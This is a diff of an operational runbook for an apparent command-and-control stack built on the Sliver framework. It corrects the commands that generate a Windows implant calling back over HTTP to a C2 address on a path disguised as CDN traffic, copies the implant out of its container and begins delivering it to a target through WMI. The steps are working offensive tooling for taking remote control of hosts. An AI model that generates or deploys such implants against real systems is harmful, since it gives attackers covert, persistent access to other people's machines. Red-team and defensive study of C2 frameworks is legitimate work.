@@ -332,12 +332,21 @@ Verify that all service status cards display **● RUNNING** in green.
    `/bundles`, `/script`, `/scripts` — CDN-disguise pages, not C2 paths).
 2. **Generate a Sliver payload** — a `session` implant calls straight back as
    a taskable session; a `beacon` only checks in periodically and needs
-   `interactive` before it takes tasks:
+   `interactive` before it takes tasks. **The CLI (v1.7.7) has no
+   `session` word**: `generate [flags]` builds the session implant,
+   `generate beacon [flags]` the beacon. Passing `session` still
+   compiles but silently skips the save step (no "Implant saved to").
+   The session/beacon difference comes from the listener in the URL, not
+   a token:
    ```bash
    docker exec c2stack-sliver-1 sh -c \
-     "printf 'generate session --http <C2STACK_IP>:80/cloud/storage/objects --os windows --arch amd64 --save /tmp/sess.exe\nexit\n' > /tmp/g.rc; sliver-client console --rc /tmp/g.rc"
+     "printf 'generate --http <C2STACK_IP>:80/cloud/storage/objects --os windows --arch amd64 --save /tmp/sess.exe\nexit\n' > /tmp/g.rc; sliver-client console --rc /tmp/g.rc"
    docker cp c2stack-sliver-1:/tmp/sess.exe ./sess.exe
    ```
+   > **Trap (2026-10-11):** the sliver client also silently skips the save
+   > when the `--save` target already exists (build still says "Build
+   > completed", no "Implant saved to"). `sliver_client.generate()` in the
+   > portal now `rm -f`s the target first; a manual rc must `rm` too.
 3. **Execute & Interact** — deliver `sess.exe` to the target (WMI launch keeps
    it detached from your SSH session):
    ```cmd
